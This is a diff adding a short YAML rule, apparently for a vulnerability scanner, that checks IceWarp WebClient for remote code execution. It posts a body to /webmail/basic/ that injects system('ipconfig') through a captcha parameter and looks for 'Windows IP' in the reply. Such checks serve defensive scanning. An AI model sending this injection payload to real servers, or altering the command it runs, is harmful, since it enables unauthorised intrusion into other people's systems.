@@ -1,0 +1,12 @@
+name: icewarp-webclient-basic-rce
+rules:
+  r0:
+    request:
+      method: POST
+      path: /webmail/basic/
+      headers:
+        Cookie: use_cookies=1
+      body: |
+        _dlg[captcha][target]=system(\'ipconfig\')\
+    expression: response.body.bcontains(b'Windows IP')
+expression: r0()
